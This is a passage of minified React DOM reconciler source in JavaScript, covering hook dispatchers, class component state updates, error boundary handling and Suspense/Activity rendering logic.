    var e = {};
    return (
      (t.next = {
        memoizedState: e,
        baseState: e,
        baseQueue: null,
        queue: {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: Lt,
          lastRenderedState: e,
        },
        next: null,
      }),
      (l.memoizedState = t),
      (l = l.alternate),
      l !== null && (l.memoizedState = t),
      t
    );
  }
  function so(l) {
    var t = co(l);
    t.next === null && (t = l.alternate.memoizedState),
      Ia(l, t.next.queue, {}, rt());
  }
  function tf() {
    return Gl(vu);
  }
  function oo() {
    return zl().memoizedState;
  }
  function ro() {
    return zl().memoizedState;
  }
  function K1(l) {
    for (var t = l.return; t !== null; ) {
      switch (t.tag) {
        case 24:
        case 3:
          var e = rt();
          l = ie(e);
          var a = fe(t, l, e);
          a !== null && (et(a, t, e), wa(a, t, e)),
            (t = { cache: Ci() }),
            (l.payload = t);
          return;
      }
      t = t.return;
    }
  }
  function J1(l, t, e) {
    var a = rt();
    (e = {
      lane: a,
      revertLane: 0,
      gesture: null,
      action: e,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    }),
      nn(l)
        ? ho(t, e)
        : ((e = bi(l, t, e, a)), e !== null && (et(e, l, a), vo(e, t, a)));
  }
  function yo(l, t, e) {
    var a = rt();
    Ia(l, t, e, a);
  }
  function Ia(l, t, e, a) {
    var u = {
      lane: a,
      revertLane: 0,
      gesture: null,
      action: e,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    };
    if (nn(l)) ho(t, u);
    else {
      var n = l.alternate;
      if (
        l.lanes === 0 &&
        (n === null || n.lanes === 0) &&
        ((n = t.lastRenderedReducer), n !== null)
      )
        try {
          var i = t.lastRenderedState,
            f = n(i, e);
          if (((u.hasEagerState = !0), (u.eagerState = f), it(f, i)))
            return Gu(l, t, u, 0), dl === null && Yu(), !1;
        } catch {
        } finally {
        }
      if (((e = bi(l, t, u, a)), e !== null))
        return et(e, l, a), vo(e, t, a), !0;
    }
    return !1;
  }
  function ef(l, t, e, a) {
    if (
      ((a = {
        lane: 2,
        revertLane: Bf(),
        gesture: null,
        action: a,
        hasEagerState: !1,
        eagerState: null,
        next: null,
      }),
      nn(l))
    ) {
      if (t) throw Error(v(479));
    } else (t = bi(l, e, a, 2)), t !== null && et(t, l, 2);
  }
  function nn(l) {
    var t = l.alternate;
    return l === L || (t !== null && t === L);
  }
  function ho(l, t) {
    da = Iu = !0;
    var e = l.pending;
    e === null ? (t.next = t) : ((t.next = e.next), (e.next = t)),
      (l.pending = t);
  }
  function vo(l, t, e) {
    if ((e & 4194048) !== 0) {
      var a = t.lanes;
      (a &= l.pendingLanes), (e |= a), (t.lanes = e), bc(l, e);
    }
  }
  var Pa = {
    readContext: Gl,
    use: tn,
    useCallback: gl,
    useContext: gl,
    useEffect: gl,
    useImperativeHandle: gl,
    useLayoutEffect: gl,
    useInsertionEffect: gl,
    useMemo: gl,
    useReducer: gl,
    useRef: gl,
    useState: gl,
    useDebugValue: gl,
    useDeferredValue: gl,
    useTransition: gl,
    useSyncExternalStore: gl,
    useId: gl,
    useHostTransitionStatus: gl,
    useFormState: gl,
    useActionState: gl,
    useOptimistic: gl,
    useMemoCache: gl,
    useCacheRefresh: gl,
  };
  Pa.useEffectEvent = gl;
  var mo = {
      readContext: Gl,
      use: tn,
      useCallback: function (l, t) {
        return (Wl().memoizedState = [l, t === void 0 ? null : t]), l;
      },
      useContext: Gl,
      useEffect: Is,
      useImperativeHandle: function (l, t, e) {
        (e = e != null ? e.concat([l]) : null),
          an(4194308, 4, eo.bind(null, t, l), e);
      },
      useLayoutEffect: function (l, t) {
        return an(4194308, 4, l, t);
      },
      useInsertionEffect: function (l, t) {
        an(4, 2, l, t);
      },
      useMemo: function (l, t) {
        var e = Wl();
        t = t === void 0 ? null : t;
        var a = l();
        if (Ye) {
          It(!0);
          try {
            l();
          } finally {
            It(!1);
          }
        }
        return (e.memoizedState = [a, t]), a;
      },
      useReducer: function (l, t, e) {
        var a = Wl();
        if (e !== void 0) {
          var u = e(t);
          if (Ye) {
            It(!0);
            try {
              e(t);
            } finally {
              It(!1);
            }
          }
        } else u = t;
        return (
          (a.memoizedState = a.baseState = u),
          (l = {
            pending: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: l,
            lastRenderedState: u,
          }),
          (a.queue = l),
          (l = l.dispatch = J1.bind(null, L, l)),
          [a.memoizedState, l]
        );
      },
      useRef: function (l) {
        var t = Wl();
        return (l = { current: l }), (t.memoizedState = l);
      },
      useState: function (l) {
        l = ki(l);
        var t = l.queue,
          e = yo.bind(null, L, t);
        return (t.dispatch = e), [l.memoizedState, e];
      },
      useDebugValue: Ii,
      useDeferredValue: function (l, t) {
        var e = Wl();
        return Pi(e, l, t);
      },
      useTransition: function () {
        var l = ki(!1);
        return (
          (l = fo.bind(null, L, l.queue, !0, !1)),
          (Wl().memoizedState = l),
          [!1, l]
        );
      },
      useSyncExternalStore: function (l, t, e) {
        var a = L,
          u = Wl();
        if (F) {
          if (e === void 0) throw Error(v(407));
          e = e();
        } else {
          if (((e = t()), dl === null)) throw Error(v(349));
          (k & 127) !== 0 || Ns(a, t, e);
        }
        u.memoizedState = e;
        var n = { value: e, getSnapshot: t };
        return (
          (u.queue = n),
          Is(Ys.bind(null, a, n, l), [l]),
          (a.flags |= 2048),
          ya(9, { destroy: void 0 }, qs.bind(null, a, n, e, t), null),
          e
        );
      },
      useId: function () {
        var l = Wl(),
          t = dl.identifierPrefix;
        if (F) {
          var e = Ct,
            a = Ot;
          (e = (a & ~(1 << (32 - nt(a) - 1))).toString(32) + e),
            (t = "_" + t + "R_" + e),
            (e = Pu++),
            0 < e && (t += "H" + e.toString(32)),
            (t += "_");
        } else (e = G1++), (t = "_" + t + "r_" + e.toString(32) + "_");
        return (l.memoizedState = t);
      },
      useHostTransitionStatus: tf,
      useFormState: ws,
      useActionState: ws,
      useOptimistic: function (l) {
        var t = Wl();
        t.memoizedState = t.baseState = l;
        var e = {
          pending: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: null,
          lastRenderedState: null,
        };
        return (
          (t.queue = e), (t = ef.bind(null, L, !0, e)), (e.dispatch = t), [l, t]
        );
      },
      useMemoCache: Ji,
      useCacheRefresh: function () {
        return (Wl().memoizedState = K1.bind(null, L));
      },
      useEffectEvent: function (l) {
        var t = Wl(),
          e = { impl: l };
        return (
          (t.memoizedState = e),
          function () {
            if ((tl & 2) !== 0) throw Error(v(440));
            return e.impl.apply(void 0, arguments);
          }
        );
      },
    },
    af = {
      readContext: Gl,
      use: tn,
      useCallback: uo,
      useContext: Gl,
      useEffect: Fi,
      useImperativeHandle: ao,
      useInsertionEffect: lo,
      useLayoutEffect: to,
      useMemo: no,
      useReducer: en,
      useRef: Fs,
      useState: function () {
        return en(Lt);
      },
      useDebugValue: Ii,
      useDeferredValue: function (l, t) {
        var e = zl();
        return io(e, il.memoizedState, l, t);
      },
      useTransition: function () {
        var l = en(Lt)[0],
          t = zl().memoizedState;
        return [typeof l == "boolean" ? l : Fa(l), t];
      },
      useSyncExternalStore: Bs,
      useId: oo,
      useHostTransitionStatus: tf,
      useFormState: Ws,
      useActionState: Ws,
      useOptimistic: function (l, t) {
        var e = zl();
        return Ls(e, il, l, t);
      },
      useMemoCache: Ji,
      useCacheRefresh: ro,
    };
  af.useEffectEvent = Ps;
  var go = {
    readContext: Gl,
    use: tn,
    useCallback: uo,
    useContext: Gl,
    useEffect: Fi,
    useImperativeHandle: ao,
    useInsertionEffect: lo,
    useLayoutEffect: to,
    useMemo: no,
    useReducer: Wi,
    useRef: Fs,
    useState: function () {
      return Wi(Lt);
    },
    useDebugValue: Ii,
    useDeferredValue: function (l, t) {
      var e = zl();
      return il === null ? Pi(e, l, t) : io(e, il.memoizedState, l, t);
    },
    useTransition: function () {
      var l = Wi(Lt)[0],
        t = zl().memoizedState;
      return [typeof l == "boolean" ? l : Fa(l), t];
    },
    useSyncExternalStore: Bs,
    useId: oo,
    useHostTransitionStatus: tf,
    useFormState: $s,
    useActionState: $s,
    useOptimistic: function (l, t) {
      var e = zl();
      return il !== null
        ? Ls(e, il, l, t)
        : ((e.baseState = l), [l, e.queue.dispatch]);
    },
    useMemoCache: Ji,
    useCacheRefresh: ro,
  };
  go.useEffectEvent = Ps;
  function uf(l, t, e, a) {
    (t = l.memoizedState),
      (e = e(a, t)),
      (e = e == null ? t : R({}, t, e)),
      (l.memoizedState = e),
      l.lanes === 0 && (l.updateQueue.baseState = e);
  }
  var nf = {
    enqueueSetState: function (l, t, e) {
      l = l._reactInternals;
      var a = rt(),
        u = ie(a);
      (u.payload = t),
        e != null && (u.callback = e),
        (t = fe(l, u, a)),
        t !== null && (et(t, l, a), wa(t, l, a));
    },
    enqueueReplaceState: function (l, t, e) {
      l = l._reactInternals;
      var a = rt(),
        u = ie(a);
      (u.tag = 1),
        (u.payload = t),
        e != null && (u.callback = e),
        (t = fe(l, u, a)),
        t !== null && (et(t, l, a), wa(t, l, a));
    },
    enqueueForceUpdate: function (l, t) {
      l = l._reactInternals;
      var e = rt(),
        a = ie(e);
      (a.tag = 2),
        t != null && (a.callback = t),
        (t = fe(l, a, e)),
        t !== null && (et(t, l, e), wa(t, l, e));
    },
  };
  function So(l, t, e, a, u, n, i) {
    return (
      (l = l.stateNode),
      typeof l.shouldComponentUpdate == "function"
        ? l.shouldComponentUpdate(a, n, i)
        : t.prototype && t.prototype.isPureReactComponent
        ? !Ga(e, a) || !Ga(u, n)
        : !0
    );
  }
  function bo(l, t, e, a) {
    (l = t.state),
      typeof t.componentWillReceiveProps == "function" &&
        t.componentWillReceiveProps(e, a),
      typeof t.UNSAFE_componentWillReceiveProps == "function" &&
        t.UNSAFE_componentWillReceiveProps(e, a),
      t.state !== l && nf.enqueueReplaceState(t, t.state, null);
  }
  function Ge(l, t) {
    var e = t;
    if ("ref" in t) {
      e = {};
      for (var a in t) a !== "ref" && (e[a] = t[a]);
    }
    if ((l = l.defaultProps)) {
      e === t && (e = R({}, e));
      for (var u in l) e[u] === void 0 && (e[u] = l[u]);
    }
    return e;
  }
  function po(l) {
    qu(l);
  }
  function xo(l) {
    console.error(l);
  }
  function zo(l) {
    qu(l);
  }
  function fn(l, t) {
    try {
      var e = l.onUncaughtError;
      e(t.value, { componentStack: t.stack });
    } catch (a) {
      setTimeout(function () {
        throw a;
      });
    }
  }
  function To(l, t, e) {
    try {
      var a = l.onCaughtError;
      a(e.value, {
        componentStack: e.stack,
        errorBoundary: t.tag === 1 ? t.stateNode : null,
      });
    } catch (u) {
      setTimeout(function () {
        throw u;
      });
    }
  }
  function ff(l, t, e) {
    return (
      (e = ie(e)),
      (e.tag = 3),
      (e.payload = { element: null }),
      (e.callback = function () {
        fn(l, t);
      }),
      e
    );
  }
  function Eo(l) {
    return (l = ie(l)), (l.tag = 3), l;
  }
  function Ao(l, t, e, a) {
    var u = e.type.getDerivedStateFromError;
    if (typeof u == "function") {
      var n = a.value;
      (l.payload = function () {
        return u(n);
      }),
        (l.callback = function () {
          To(t, e, a);
        });
    }
    var i = e.stateNode;
    i !== null &&
      typeof i.componentDidCatch == "function" &&
      (l.callback = function () {
        To(t, e, a),
          typeof u != "function" &&
            (ye === null ? (ye = new Set([this])) : ye.add(this));
        var f = a.stack;
        this.componentDidCatch(a.value, {
          componentStack: f !== null ? f : "",
        });
      });
  }
  function w1(l, t, e, a, u) {
    if (
      ((e.flags |= 32768),
      a !== null && typeof a == "object" && typeof a.then == "function")
    ) {
      if (
        ((t = e.alternate),
        t !== null && na(t, e, u, !0),
        (e = ct.current),
        e !== null)
      ) {
        switch (e.tag) {
          case 31:
          case 13:
            return (
              zt === null ? bn() : e.alternate === null && Sl === 0 && (Sl = 3),
              (e.flags &= -257),
              (e.flags |= 65536),
              (e.lanes = u),
              a === wu
                ? (e.flags |= 16384)
                : ((t = e.updateQueue),
                  t === null ? (e.updateQueue = new Set([a])) : t.add(a),
                  Uf(l, a, u)),
              !1
            );
          case 22:
            return (
              (e.flags |= 65536),
              a === wu
                ? (e.flags |= 16384)
                : ((t = e.updateQueue),
                  t === null
                    ? ((t = {
                        transitions: null,
                        markerInstances: null,
                        retryQueue: new Set([a]),
                      }),
                      (e.updateQueue = t))
                    : ((e = t.retryQueue),
                      e === null ? (t.retryQueue = new Set([a])) : e.add(a)),
                  Uf(l, a, u)),
              !1
            );
        }
        throw Error(v(435, e.tag));
      }
      return Uf(l, a, u), bn(), !1;
    }
    if (F)
      return (
        (t = ct.current),
        t !== null
          ? ((t.flags & 65536) === 0 && (t.flags |= 256),
            (t.flags |= 65536),
            (t.lanes = u),
            a !== Ai && ((l = Error(v(422), { cause: a })), Qa(St(l, e))))
          : (a !== Ai && ((t = Error(v(423), { cause: a })), Qa(St(t, e))),
            (l = l.current.alternate),
            (l.flags |= 65536),
            (u &= -u),
            (l.lanes |= u),
            (a = St(a, e)),
            (u = ff(l.stateNode, a, u)),
            Ni(l, u),
            Sl !== 4 && (Sl = 2)),
        !1
      );
    var n = Error(v(520), { cause: a });
    if (
      ((n = St(n, e)),
      fu === null ? (fu = [n]) : fu.push(n),
      Sl !== 4 && (Sl = 2),
      t === null)
    )
      return !0;
    (a = St(a, e)), (e = t);
    do {
      switch (e.tag) {
        case 3:
          return (
            (e.flags |= 65536),
            (l = u & -u),
            (e.lanes |= l),
            (l = ff(e.stateNode, a, l)),
            Ni(e, l),
            !1
          );
        case 1:
          if (
            ((t = e.type),
            (n = e.stateNode),
            (e.flags & 128) === 0 &&
              (typeof t.getDerivedStateFromError == "function" ||
                (n !== null &&
                  typeof n.componentDidCatch == "function" &&
                  (ye === null || !ye.has(n)))))
          )
            return (
              (e.flags |= 65536),
              (u &= -u),
              (e.lanes |= u),
              (u = Eo(u)),
              Ao(u, l, e, a),
              Ni(e, u),
              !1
            );
      }
      e = e.return;
    } while (e !== null);
    return !1;
  }
  var cf = Error(v(461)),
    Al = !1;
  function Xl(l, t, e, a) {
    t.child = l === null ? _s(t, null, e, a) : qe(t, l.child, e, a);
  }
  function jo(l, t, e, a, u) {
    e = e.render;
    var n = t.ref;
    if ("ref" in a) {
      var i = {};
      for (var f in a) f !== "ref" && (i[f] = a[f]);
    } else i = a;
    return (
      He(t),
      (a = Qi(l, t, e, i, n, u)),
      (f = Zi()),
      l !== null && !Al
        ? (Vi(l, t, u), Qt(l, t, u))
        : (F && f && Ti(t), (t.flags |= 1), Xl(l, t, a, u), t.child)
    );
  }
  function Mo(l, t, e, a, u) {
    if (l === null) {
      var n = e.type;
      return typeof n == "function" &&
        !pi(n) &&
        n.defaultProps === void 0 &&
        e.compare === null
        ? ((t.tag = 15), (t.type = n), _o(l, t, n, a, u))
        : ((l = Lu(e.type, null, a, t, t.mode, u)),
          (l.ref = t.ref),
          (l.return = t),
          (t.child = l));
    }
    if (((n = l.child), !mf(l, u))) {
      var i = n.memoizedProps;
      if (
        ((e = e.compare), (e = e !== null ? e : Ga), e(i, a) && l.ref === t.ref)
      )
        return Qt(l, t, u);
    }
    return (
      (t.flags |= 1),
      (l = Nt(n, a)),
      (l.ref = t.ref),
      (l.return = t),
      (t.child = l)
    );
  }
  function _o(l, t, e, a, u) {
    if (l !== null) {
      var n = l.memoizedProps;
      if (Ga(n, a) && l.ref === t.ref)
        if (((Al = !1), (t.pendingProps = a = n), mf(l, u)))
          (l.flags & 131072) !== 0 && (Al = !0);
        else return (t.lanes = l.lanes), Qt(l, t, u);
    }
    return sf(l, t, e, a, u);
  }
  function Oo(l, t, e, a) {
    var u = a.children,
      n = l !== null ? l.memoizedState : null;
    if (
      (l === null &&
        t.stateNode === null &&
        (t.stateNode = {
          _visibility: 1,
          _pendingMarkers: null,
          _retryCache: null,
          _transitions: null,
        }),
      a.mode === "hidden")
    ) {
      if ((t.flags & 128) !== 0) {
        if (((n = n !== null ? n.baseLanes | e : e), l !== null)) {
          for (a = t.child = l.child, u = 0; a !== null; )
            (u = u | a.lanes | a.childLanes), (a = a.sibling);
          a = u & ~n;
        } else (a = 0), (t.child = null);
        return Co(l, t, n, e, a);
      }
      if ((e & 536870912) !== 0)
        (t.memoizedState = { baseLanes: 0, cachePool: null }),
          l !== null && Ku(t, n !== null ? n.cachePool : null),
          n !== null ? Ds(t, n) : Yi(),
          Us(t);
      else
        return (
          (a = t.lanes = 536870912),
          Co(l, t, n !== null ? n.baseLanes | e : e, e, a)
        );
    } else
      n !== null
        ? (Ku(t, n.cachePool), Ds(t, n), se(), (t.memoizedState = null))
        : (l !== null && Ku(t, null), Yi(), se());
    return Xl(l, t, u, e), t.child;
  }
  function lu(l, t) {
    return (
      (l !== null && l.tag === 22) ||
        t.stateNode !== null ||
        (t.stateNode = {
          _visibility: 1,
          _pendingMarkers: null,
          _retryCache: null,
          _transitions: null,
        }),
      t.sibling
    );
  }
  function Co(l, t, e, a, u) {
    var n = Ui();
    return (
      (n = n === null ? null : { parent: Tl._currentValue, pool: n }),
      (t.memoizedState = { baseLanes: e, cachePool: n }),
      l !== null && Ku(t, null),
      Yi(),
      Us(t),
      l !== null && na(l, t, a, !0),
      (t.childLanes = u),
      null
    );
  }
  function cn(l, t) {
    return (
      (t = on({ mode: t.mode, children: t.children }, l.mode)),
      (t.ref = l.ref),
      (l.child = t),
      (t.return = l),
      t
    );
  }
  function Do(l, t, e) {
    return (
      qe(t, l.child, null, e),
      (l = cn(t, t.pendingProps)),
      (l.flags |= 2),
      st(t),
      (t.memoizedState = null),
      l
    );
  }
  function W1(l, t, e) {
    var a = t.pendingProps,
      u = (t.flags & 128) !== 0;
    if (((t.flags &= -129), l === null)) {
      if (F) {
        if (a.mode === "hidden")
          return (l = cn(t, a)), (t.lanes = 536870912), lu(null, l);
        if (
          (Xi(t),
          (l = yl)
            ? ((l = Zd(l, xt)),
              (l = l !== null && l.data === "&" ? l : null),
              l !== null &&
                ((t.memoizedState = {
                  dehydrated: l,
                  treeContext: te !== null ? { id: Ot, overflow: Ct } : null,
                  retryLane: 536870912,
                  hydrationErrors: null,
                }),
                (e = ys(l)),
                (e.return = t),
                (t.child = e),
                (Yl = t),
                (yl = null)))
            : (l = null),
          l === null)
        )
          throw ae(t);
        return (t.lanes = 536870912), null;
      }
      return cn(t, a);
    }
    var n = l.memoizedState;
    if (n !== null) {
      var i = n.dehydrated;
      if ((Xi(t), u))
        if (t.flags & 256) (t.flags &= -257), (t = Do(l, t, e));
        else if (t.memoizedState !== null)
          (t.child = l.child), (t.flags |= 128), (t = null);
        else throw Error(v(558));
      else if (
        (Al || na(l, t, e, !1), (u = (e & l.childLanes) !== 0), Al || u)
      ) {
        if (
          ((a = dl),
          a !== null && ((i = pc(a, e)), i !== 0 && i !== n.retryLane))
        )
          throw ((n.retryLane = i), Oe(l, i), et(a, l, i), cf);
        bn(), (t = Do(l, t, e));
      } else
        (l = n.treeContext),
          (yl = Tt(i.nextSibling)),
          (Yl = t),
          (F = !0),
          (ee = null),
          (xt = !1),
          l !== null && ms(t, l),
          (t = cn(t, a)),
          (t.flags |= 4096);
      return t;
    }
    return (
      (l = Nt(l.child, { mode: a.mode, children: a.children })),
      (l.ref = t.ref),
      (t.child = l),
      (l.return = t),
      l
    );
  }
  function sn(l, t) {
    var e = t.ref;
    if (e === null) l !== null && l.ref !== null && (t.flags |= 4194816);
    else {
      if (typeof e != "function" && typeof e != "object") throw Error(v(284));
      (l === null || l.ref !== e) && (t.flags |= 4194816);
    }
  }
  function sf(l, t, e, a, u) {
    return (
      He(t),
      (e = Qi(l, t, e, a, void 0, u)),
      (a = Zi()),
      l !== null && !Al
        ? (Vi(l, t, u), Qt(l, t, u))
        : (F && a && Ti(t), (t.flags |= 1), Xl(l, t, e, u), t.child)
    );
  }
  function Uo(l, t, e, a, u, n) {
    return (
      He(t),
      (t.updateQueue = null),
      (e = Rs(t, a, e, u)),
      Hs(l),
      (a = Zi()),
      l !== null && !Al
        ? (Vi(l, t, n), Qt(l, t, n))
        : (F && a && Ti(t), (t.flags |= 1), Xl(l, t, e, n), t.child)
    );
  }
  function Ho(l, t, e, a, u) {
    if ((He(t), t.stateNode === null)) {
      var n = ta,
        i = e.contextType;
      typeof i == "object" && i !== null && (n = Gl(i)),
        (n = new e(a, n)),
        (t.memoizedState =
          n.state !== null && n.state !== void 0 ? n.state : null),
        (n.updater = nf),
        (t.stateNode = n),
        (n._reactInternals = t),
        (n = t.stateNode),
        (n.props = a),
        (n.state = t.memoizedState),
        (n.refs = {}),
        Ri(t),
        (i = e.contextType),
        (n.context = typeof i == "object" && i !== null ? Gl(i) : ta),
        (n.state = t.memoizedState),
        (i = e.getDerivedStateFromProps),
        typeof i == "function" && (uf(t, e, i, a), (n.state = t.memoizedState)),
        typeof e.getDerivedStateFromProps == "function" ||
          typeof n.getSnapshotBeforeUpdate == "function" ||
          (typeof n.UNSAFE_componentWillMount != "function" &&
            typeof n.componentWillMount != "function") ||
          ((i = n.state),
          typeof n.componentWillMount == "function" && n.componentWillMount(),
          typeof n.UNSAFE_componentWillMount == "function" &&
            n.UNSAFE_componentWillMount(),
          i !== n.state && nf.enqueueReplaceState(n, n.state, null),
          ka(t, a, n, u),
          Wa(),
          (n.state = t.memoizedState)),
        typeof n.componentDidMount == "function" && (t.flags |= 4194308),
        (a = !0);
    } else if (l === null) {
      n = t.stateNode;
      var f = t.memoizedProps,
        c = Ge(e, f);
      n.props = c;
      var h = n.context,
        b = e.contextType;
      (i = ta), typeof b == "object" && b !== null && (i = Gl(b));
      var x = e.getDerivedStateFromProps;
      (b =
        typeof x == "function" ||
        typeof n.getSnapshotBeforeUpdate == "function"),
        (f = t.pendingProps !== f),
        b ||
          (typeof n.UNSAFE_componentWillReceiveProps != "function" &&
            typeof n.componentWillReceiveProps != "function") ||
          ((f || h !== i) && bo(t, n, a, i)),
        (ne = !1);
      var m = t.memoizedState;
      (n.state = m),
        ka(t, a, n, u),
        Wa(),
        (h = t.memoizedState),
        f || m !== h || ne
          ? (typeof x == "function" && (uf(t, e, x, a), (h = t.memoizedState)),
            (c = ne || So(t, e, c, a, m, h, i))
              ? (b ||
                  (typeof n.UNSAFE_componentWillMount != "function" &&
                    typeof n.componentWillMount != "function") ||
                  (typeof n.componentWillMount == "function" &&
                    n.componentWillMount(),
                  typeof n.UNSAFE_componentWillMount == "function" &&
                    n.UNSAFE_componentWillMount()),
                typeof n.componentDidMount == "function" &&
                  (t.flags |= 4194308))
              : (typeof n.componentDidMount == "function" &&
                  (t.flags |= 4194308),
                (t.memoizedProps = a),
                (t.memoizedState = h)),
            (n.props = a),
            (n.state = h),
            (n.context = i),
            (a = c))
          : (typeof n.componentDidMount == "function" && (t.flags |= 4194308),
            (a = !1));
    } else {
      (n = t.stateNode),
        Bi(l, t),
        (i = t.memoizedProps),
        (b = Ge(e, i)),
        (n.props = b),
        (x = t.pendingProps),
        (m = n.context),
        (h = e.contextType),
        (c = ta),
        typeof h == "object" && h !== null && (c = Gl(h)),
        (f = e.getDerivedStateFromProps),
        (h =
          typeof f == "function" ||
          typeof n.getSnapshotBeforeUpdate == "function") ||
          (typeof n.UNSAFE_componentWillReceiveProps != "function" &&
            typeof n.componentWillReceiveProps != "function") ||
          ((i !== x || m !== c) && bo(t, n, a, c)),
        (ne = !1),
        (m = t.memoizedState),
        (n.state = m),
        ka(t, a, n, u),
        Wa();
      var g = t.memoizedState;
      i !== x ||
      m !== g ||
      ne ||
      (l !== null && l.dependencies !== null && Zu(l.dependencies))
        ? (typeof f == "function" && (uf(t, e, f, a), (g = t.memoizedState)),
          (b =
            ne ||
            So(t, e, b, a, m, g, c) ||
            (l !== null && l.dependencies !== null && Zu(l.dependencies)))
            ? (h ||
                (typeof n.UNSAFE_componentWillUpdate != "function" &&
                  typeof n.componentWillUpdate != "function") ||
                (typeof n.componentWillUpdate == "function" &&
                  n.componentWillUpdate(a, g, c),
                typeof n.UNSAFE_componentWillUpdate == "function" &&
                  n.UNSAFE_componentWillUpdate(a, g, c)),
              typeof n.componentDidUpdate == "function" && (t.flags |= 4),
              typeof n.getSnapshotBeforeUpdate == "function" &&
                (t.flags |= 1024))
            : (typeof n.componentDidUpdate != "function" ||
                (i === l.memoizedProps && m === l.memoizedState) ||
                (t.flags |= 4),
              typeof n.getSnapshotBeforeUpdate != "function" ||
                (i === l.memoizedProps && m === l.memoizedState) ||
                (t.flags |= 1024),
              (t.memoizedProps = a),
              (t.memoizedState = g)),
          (n.props = a),
          (n.state = g),
          (n.context = c),
          (a = b))
        : (typeof n.componentDidUpdate != "function" ||
            (i === l.memoizedProps && m === l.memoizedState) ||
            (t.flags |= 4),
          typeof n.getSnapshotBeforeUpdate != "function" ||
            (i === l.memoizedProps && m === l.memoizedState) ||
            (t.flags |= 1024),
          (a = !1));
    }
    return (
      (n = a),
      sn(l, t),
      (a = (t.flags & 128) !== 0),
      n || a
        ? ((n = t.stateNode),
          (e =
            a && typeof e.getDerivedStateFromError != "function"
              ? null
              : n.render()),
          (t.flags |= 1),
          l !== null && a
            ? ((t.child = qe(t, l.child, null, u)),
              (t.child = qe(t, null, e, u)))
            : Xl(l, t, e, u),
          (t.memoizedState = n.state),
          (l = t.child))
        : (l = Qt(l, t, u)),
      l
    );
  }
  function Ro(l, t, e, a) {
    return De(), (t.flags |= 256), Xl(l, t, e, a), t.child;
  }
  var of = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0,
    hydrationErrors: null,
  };
  function df(l) {
    return { baseLanes: l, cachePool: zs() };
  }
  function rf(l, t, e) {
    return (l = l !== null ? l.childLanes & ~e : 0), t && (l |= dt), l;
  }
  function Bo(l, t, e) {
    var a = t.pendingProps,
      u = !1,
      n = (t.flags & 128) !== 0,
      i;
    if (
      ((i = n) ||
        (i =
          l !== null && l.memoizedState === null ? !1 : (xl.current & 2) !== 0),
      i && ((u = !0), (t.flags &= -129)),
      (i = (t.flags & 32) !== 0),
      (t.flags &= -33),
      l === null)
    ) {
      if (F) {
        if (
          (u ? ce(t) : se(),
          (l = yl)
            ? ((l = Zd(l, xt)),
              (l = l !== null && l.data !== "&" ? l : null),
              l !== null &&
                ((t.memoizedState = {
                  dehydrated: l,
                  treeContext: te !== null ? { id: Ot, overflow: Ct } : null,
                  retryLane: 536870912,
                  hydrationErrors: null,
                }),
                (e = ys(l)),
                (e.return = t),
                (t.child = e),
                (Yl = t),
                (yl = null)))
            : (l = null),
          l === null)
        )
          throw ae(t);
        return Wf(l) ? (t.lanes = 32) : (t.lanes = 536870912), null;
      }
      var f = a.children;
      return (
        (a = a.fallback),
        u
          ? (se(),
            (u = t.mode),
            (f = on({ mode: "hidden", children: f }, u)),
            (a = Ce(a, u, e, null)),
            (f.return = t),
            (a.return = t),
            (f.sibling = a),
            (t.child = f),
            (a = t.child),
            (a.memoizedState = df(e)),
            (a.childLanes = rf(l, i, e)),
            (t.memoizedState = of),
            lu(null, a))
          : (ce(t), yf(t, f))
      );
    }
    var c = l.memoizedState;
    if (c !== null && ((f = c.dehydrated), f !== null)) {
      if (n)
        t.flags & 256
          ? (ce(t), (t.flags &= -257), (t = hf(l, t, e)))
          : t.memoizedState !== null
          ? (se(), (t.child = l.child), (t.flags |= 128), (t = null))
          : (se(),
            (f = a.fallback),
            (u = t.mode),
            (a = on({ mode: "visible", children: a.children }, u)),
            (f = Ce(f, u, e, null)),
            (f.flags |= 2),
            (a.return = t),
            (f.return = t),
            (a.sibling = f),
            (t.child = a),
            qe(t, l.child, null, e),
            (a = t.child),
            (a.memoizedState = df(e)),
            (a.childLanes = rf(l, i, e)),
            (t.memoizedState = of),
            (t = lu(null, a)));
      else if ((ce(t), Wf(f))) {
        if (((i = f.nextSibling && f.nextSibling.dataset), i)) var h = i.dgst;
        (i = h),
          (a = Error(v(419))),
          (a.stack = ""),
          (a.digest = i),
          Qa({ value: a, source: null, stack: null }),
          (t = hf(l, t, e));
      } else if (
        (Al || na(l, t, e, !1), (i = (e & l.childLanes) !== 0), Al || i)
      ) {
        if (
          ((i = dl),
          i !== null && ((a = pc(i, e)), a !== 0 && a !== c.retryLane))
        )
          throw ((c.retryLane = a), Oe(l, a), et(i, l, a), cf);
        wf(f) || bn(), (t = hf(l, t, e));
      } else
        wf(f)
          ? ((t.flags |= 192), (t.child = l.child), (t = null))
          : ((l = c.treeContext),
            (yl = Tt(f.nextSibling)),
            (Yl = t),
            (F = !0),
            (ee = null),
            (xt = !1),
            l !== null && ms(t, l),
            (t = yf(t, a.children)),
            (t.flags |= 4096));
      return t;
    }
    return u
      ? (se(),
        (f = a.fallback),
        (u = t.mode),
        (c = l.child),
        (h = c.sibling),
        (a = Nt(c, { mode: "hidden", children: a.children })),
        (a.subtreeFlags = c.subtreeFlags & 65011712),
        h !== null ? (f = Nt(h, f)) : ((f = Ce(f, u, e, null)), (f.flags |= 2)),
        (f.return = t),
        (a.return = t),
        (a.sibling = f),
        (t.child = a),
        lu(null, a),
        (a = t.child),
        (f = l.child.memoizedState),
        f === null
          ? (f = df(e))
          : ((u = f.cachePool),
            u !== null
              ? ((c = Tl._currentValue),
                (u = u.parent !== c ? { parent: c, pool: c } : u))
              : (u = zs()),
            (f = { baseLanes: f.baseLanes | e, cachePool: u })),
        (a.memoizedState = f),
        (a.childLanes = rf(l, i, e)),
        (t.memoizedState = of),
        lu(l.child, a))
      : (ce(t),
        (e = l.child),
        (l = e.sibling),
        (e = Nt(e, { mode: "visible", children: a.children })),
        (e.return = t),
        (e.sibling = null),
        l !== null &&
          ((i = t.deletions),
          i === null ? ((t.deletions = [l]), (t.flags |= 16)) : i.push(l)),
        (t.child = e),
        (t.memoizedState = null),
        e);
  }
  function yf(l, t) {
    return (
      (t = on({ mode: "visible", children: t }, l.mode)),
      (t.return = l),
      (l.child = t)
    );
  }
  function on(l, t) {
